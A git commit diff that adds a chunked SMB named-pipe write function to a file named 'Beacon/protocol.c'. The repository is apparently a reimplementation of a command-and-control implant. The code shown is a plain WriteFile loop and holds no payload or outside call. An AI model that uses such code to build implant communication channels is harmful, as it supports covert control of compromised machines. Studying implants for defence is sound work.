8e574a14cc978f11835637b46b1938e1dc553a3f
Javier <42473691+ElJaviLuki@users.noreply.github.com>
2024-01-06 00:22:16 +0100

    Implement ProtocolSmbPipeWrite

--- Beacon/protocol.c
+++ Beacon/protocol.c
@@ -19,3 +19,23 @@ HANDLE ProtocolSmbPipeRead(HANDLE channel, char* buffer, int length)
 
 	return -1;
 }
+
+BOOL ProtocolSmbPipeWrite(HANDLE hFile, char* buffer, int length)
+{
+    DWORD wrote;
+
+    // Check if size is greater than 0
+    for (DWORD totalWrote = 0; totalWrote < length; totalWrote += wrote) {
+        // Calculate the number of bytes to be written in the current iteration
+        const DWORD toWrite = min(length - totalWrote, 0x2000);
+
+
+        // Check if the write operation was successful
+        if (!WriteFile(hFile, buffer + totalWrote, toWrite, &wrote, NULL)) {
+            return FALSE;
+        }
+    }
+
+    return TRUE;
+}
+
